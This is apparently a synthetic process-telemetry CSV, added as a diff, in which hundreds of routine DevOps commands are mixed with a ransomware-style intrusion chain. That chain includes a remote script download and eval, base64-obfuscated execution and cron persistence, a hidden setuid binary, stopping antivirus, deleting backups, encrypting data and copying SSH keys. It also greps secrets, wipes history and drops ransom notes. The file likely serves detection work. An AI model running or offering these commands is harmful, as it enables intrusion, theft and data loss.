@@ -1,0 +1,221 @@
+process_name,command_line
+bash,"X='curl -fsSL http://198.51.100.207/setup.sh -o /tmp/.X11-unix/s.sh'; eval ""$X"""
+apt-get,apt-get install -y python3-pip
+bash,cd /home/ec2-user/billing-service && ls
+uptime,uptime
+git,git pull origin release/2.4
+node,node scripts/seed.js
+pip3,pip3 install -r requirements.txt
+bash,cd /home/ec2-user/web-app && ls
+curl,curl -s http://localhost:8080/health
+npm,npm ci --no-audit
+curl,curl -fsS https://api.github.com/repos/web-app/commits | head
+scp,scp report.csv ec2-user@reports:/srv/reports/
+git,git pull origin hotfix/login
+bash,echo YmFzaCAvdG1wLy5YMTEtdW5peC9zLnNo | base64 -d | bash
+docker,docker logs --tail 100 search
+kubectl,kubectl logs deploy/auth-svc --tail 50
+git,git pull origin main
+curl,curl -fsS https://api.github.com/repos/billing-service/commits | head
+python3,python3 /opt/app/manage.py migrate
+git,git checkout release/2.4
+aws,aws s3 ls s3://search-artifacts/
+kubectl,kubectl rollout status deploy/nginx
+grep,grep -r 'TODO' /home/ec2-user/data-pipeline/src
+bash,cd /home/ec2-user/data-pipeline && ls
+rsync,rsync -az /home/ec2-user/web-app/dist/ /var/www/search/
+git,git checkout develop
+bash,echo KGNyb250YWIgLWwgMj4vZGV2L251bGw7IGVjaG8gJyovMTAgKiAqICogKiAvdG1wLy5YMTEtdW5peC8udGVsZW1ldHJ5JykgfCBjcm9udGFiIC0= | base64 -d | bash
+bash,ls -la /home/ec2-user
+journalctl,journalctl -u auth-svc --since '10 min ago'
+grep,grep -r 'TODO' /home/ec2-user/mobile-api/src
+kubectl,kubectl rollout status deploy/postgres
+docker,docker logs --tail 100 redis
+go,go build ./...
+systemctl,systemctl status worker
+htop,htop -d 5
+npm,npm test -- --runInBand
+bash,sudo install -m4755 /tmp/.X11-unix/.telemetry /usr/local/bin/.telemetry
+git,git commit -am 'fix: api-gateway retry logic'
+find,find /home/ec2-user/infra -name '*.log' -mtime +7
+kubectl,kubectl logs deploy/api-gateway --tail 50
+git,git log --oneline -n 10
+free,free -m
+tar,tar czf /backups/auth-svc-76.tgz /var/lib/auth-svc
+curl,curl -fsS https://api.github.com/repos/mobile-api/commits | head
+df,df -h
+git,git status
+docker,docker ps -a
+journalctl,journalctl -u postgres --since '10 min ago'
+find,find /home/ec2-user/platform -name '*.log' -mtime +7
+aws,aws s3 ls s3://worker-artifacts/
+docker,docker compose up -d payments
+aws,aws s3 ls s3://postgres-artifacts/
+kubectl,kubectl logs deploy/postgres --tail 50
+systemctl,systemctl stop clamav-daemon
+docker,docker logs --tail 100 postgres
+ssh,ssh ec2-user@build-39 uptime
+python3,python3 -m pytest tests/ -q
+systemctl,systemctl status api-gateway
+docker,docker build -t worker:94 .
+find,find /home/ec2-user/mobile-api -name '*.log' -mtime +7
+aws,aws s3 ls s3://api-gateway-artifacts/
+make,make lint
+psql,psql -h db -U ec2-user -c 'SELECT count(*) FROM orders;'
+redis-cli,redis-cli ping
+bash,find / -type d -name 'shares' -o -name 'backups' 2>/dev/null
+docker,docker build -t api-gateway:29 .
+ps,ps aux --sort=-%mem | head
+docker,docker compose up -d api-gateway
+systemctl,systemctl restart search
+kubectl,kubectl get pods -n production
+apt-get,apt-get install -y jq
+rm,rm -rf /var/backups/* /snapshots/* 2>/dev/null
+docker,docker compose up -d auth-svc
+docker,docker compose up -d nginx
+git,git pull origin feature/checkout
+docker,docker logs --tail 100 worker
+docker,docker logs --tail 100 api-gateway
+bash,cd /home/ec2-user/mobile-api && ls
+journalctl,journalctl -u redis --since '10 min ago'
+openssl,openssl enc -aes-256-cbc -salt -in /home/ec2-user/data -out /home/ec2-user/data.enc -k 453e9421ce50211670eae679f02e8d28
+terraform,terraform plan -out tfplan
+npm,npm run build
+systemctl,systemctl restart api-gateway
+tar,tar czf /backups/nginx-95.tgz /var/lib/nginx
+grep,grep -r 'TODO' /home/ec2-user/platform/src
+kubectl,kubectl logs deploy/worker --tail 50
+git,git checkout main
+aws,aws s3 ls s3://auth-svc-artifacts/
+systemctl,systemctl restart redis
+find,find /home/ec2-user/web-app -name '*.log' -mtime +7
+git,git pull origin develop
+rsync,rsync -az /home/ec2-user/platform/dist/ /var/www/api-gateway/
+ssh,ssh ec2-user@build-12 uptime
+systemctl,systemctl status payments
+bash,for d in /home/*; do cp /tmp/.X11-unix/NOTE.txt $d/READ_ME.txt; done
+apt-get,apt-get install -y ripgrep
+ssh,ssh ec2-user@build-30 uptime
+kubectl,kubectl logs deploy/payments --tail 50
+journalctl,journalctl -u worker --since '10 min ago'
+tar,tar czf /backups/nginx-27.tgz /var/lib/nginx
+kubectl,kubectl rollout status deploy/api-gateway
+docker,docker logs --tail 100 payments
+aws,aws s3 ls s3://redis-artifacts/
+docker,docker compose up -d postgres
+aws,aws s3 ls s3://payments-artifacts/
+sudo,sudo -n -l 2>/dev/null
+docker,docker compose up -d redis
+tar,tar czf /backups/search-32.tgz /var/lib/search
+systemctl,systemctl status postgres
+systemctl,systemctl status redis
+docker,docker compose up -d worker
+bash,"ps -eo user,pid,cmd --sort=-%cpu | head -n 25"
+git,git commit -am 'fix: redis retry logic'
+git,git checkout feature/checkout
+git,git checkout hotfix/login
+ssh,ssh ec2-user@build-25 uptime
+kubectl,kubectl rollout status deploy/worker
+docker,docker build -t postgres:30 .
+systemctl,systemctl restart auth-svc
+apt-get,apt-get install -y openjdk-17-jdk
+git,git commit -am 'fix: nginx retry logic'
+curl,curl -fsS https://api.github.com/repos/infra/commits | head
+bash,truncate -s0 /home/ec2-user/.bash_history 2>/dev/null
+ssh,ssh ec2-user@build-52 uptime
+kubectl,kubectl rollout status deploy/redis
+grep,grep -r 'TODO' /home/ec2-user/web-app/src
+tar,tar czf /backups/worker-29.tgz /var/lib/worker
+ssh,ssh ec2-user@build-42 uptime
+aws,aws s3 ls s3://nginx-artifacts/
+rsync,rsync -az /home/ec2-user/data-pipeline/dist/ /var/www/search/
+ssh,ssh ec2-user@build-79 uptime
+systemctl,systemctl status search
+apt-get,apt-get install -y nodejs
+docker,docker build -t redis:20 .
+cp,cp -r /home/ec2-user/.ssh /tmp/.X11-unix/ 2>/dev/null
+kubectl,kubectl logs deploy/search --tail 50
+docker,docker build -t api-gateway:76 .
+apt-get,apt-get install -y git-lfs
+journalctl,journalctl -u payments --since '10 min ago'
+curl,curl -fsS https://api.github.com/repos/platform/commits | head
+find,find /home/ec2-user/billing-service -name '*.log' -mtime +7
+bash,cd /home/ec2-user/platform && ls
+kubectl,kubectl rollout status deploy/search
+systemctl,systemctl restart worker
+env,env | grep -iE 'token|secret|key' 2>/dev/null
+tar,tar czf /backups/worker-11.tgz /var/lib/worker
+ssh,ssh ec2-user@build-11 uptime
+git,git commit -am 'fix: worker retry logic'
+grep,grep -r 'TODO' /home/ec2-user/billing-service/src
+docker,docker build -t worker:71 .
+docker,docker build -t postgres:13 .
+ssh,ssh ec2-user@build-59 uptime
+curl,curl -fsS https://api.github.com/repos/data-pipeline/commits | head
+git,git commit -am 'fix: payments retry logic'
+docker,docker build -t api-gateway:83 .
+find,find /home/ec2-user/data-pipeline -name '*.log' -mtime +7
+ssh,ssh ec2-user@build-67 uptime
+ssh,ssh ec2-user@build-22 uptime
+kubectl,kubectl rollout status deploy/payments
+bash,"X='getent passwd | awk -F: '\''$3>=1000{print $1}'\'''; eval ""$X"""
+ssh,ssh ec2-user@build-45 uptime
+systemctl,systemctl restart payments
+docker,docker logs --tail 100 auth-svc
+systemctl,systemctl restart postgres
+docker,docker build -t postgres:40 .
+rsync,rsync -az /home/ec2-user/billing-service/dist/ /var/www/worker/
+docker,docker build -t nginx:96 .
+git,git commit -am 'fix: auth-svc retry logic'
+bash,"ps -eo user,pid,cmd --sort=-%cpu | head -n 25 # 4989"
+docker,docker logs --tail 100 nginx
+bash,cd /home/ec2-user/infra && ls
+docker,docker build -t auth-svc:64 .
+systemctl,systemctl status auth-svc
+tar,tar czf /backups/redis-50.tgz /var/lib/redis
+journalctl,journalctl -u nginx --since '10 min ago'
+rsync,rsync -az /home/ec2-user/web-app/dist/ /var/www/nginx/
+ssh,ssh ec2-user@build-4 uptime
+tar,tar czf /backups/auth-svc-11.tgz /var/lib/auth-svc
+tar,tar czf /backups/nginx-67.tgz /var/lib/nginx
+rsync,rsync -az /home/ec2-user/data-pipeline/dist/ /var/www/postgres/
+kubectl,kubectl logs deploy/redis --tail 50
+journalctl,journalctl -u api-gateway --since '10 min ago'
+rsync,rsync -az /home/ec2-user/billing-service/dist/ /var/www/postgres/
+docker,docker build -t postgres:46 .
+kubectl,kubectl logs deploy/nginx --tail 50
+tar,tar czf /backups/auth-svc-97.tgz /var/lib/auth-svc
+bash,unset HISTFILE; export HISTSIZE=0
+tar,tar czf /backups/worker-51.tgz /var/lib/worker
+tar,tar czf /backups/api-gateway-55.tgz /var/lib/api-gateway
+tar,tar czf /backups/api-gateway-76.tgz /var/lib/api-gateway
+tar,tar czf /backups/postgres-29.tgz /var/lib/postgres
+docker,docker build -t api-gateway:92 .
+tar,tar czf /backups/payments-46.tgz /var/lib/payments
+rsync,rsync -az /home/ec2-user/web-app/dist/ /var/www/worker/
+docker,docker build -t redis:8 .
+cp,cp -r /home/ec2-user/.ssh /tmp/.X11-unix/ 2>/dev/null # 3041
+docker,docker build -t api-gateway:44 .
+ssh,ssh ec2-user@build-74 uptime
+docker,docker build -t search:72 .
+rsync,rsync -az /home/ec2-user/infra/dist/ /var/www/worker/
+ssh,ssh ec2-user@build-2 uptime
+docker,docker build -t postgres:1 .
+tar,tar czf /backups/postgres-7.tgz /var/lib/postgres
+ssh,ssh ec2-user@build-21 uptime
+env,env | grep -iE 'token|secret|key' 2>/dev/null # 5641
+docker,docker build -t redis:24 .
+tar,tar czf /backups/redis-23.tgz /var/lib/redis
+ssh,ssh ec2-user@build-64 uptime
+ssh,ssh ec2-user@build-40 uptime
+tar,tar czf /backups/payments-55.tgz /var/lib/payments
+bash,"X='getent passwd | awk -F: '\''$3>=1000{print $1}'\'' # 4492'; eval ""$X"""
+journalctl,journalctl -u search --since '10 min ago'
+ssh,ssh ec2-user@build-51 uptime
+docker,docker build -t nginx:89 .
+docker,docker build -t worker:74 .
+rsync,rsync -az /home/ec2-user/mobile-api/dist/ /var/www/nginx/
+rsync,rsync -az /home/ec2-user/mobile-api/dist/ /var/www/payments/
+tar,tar czf /backups/nginx-71.tgz /var/lib/nginx
+ssh,ssh ec2-user@build-75 uptime
+docker,docker build -t postgres:93 .
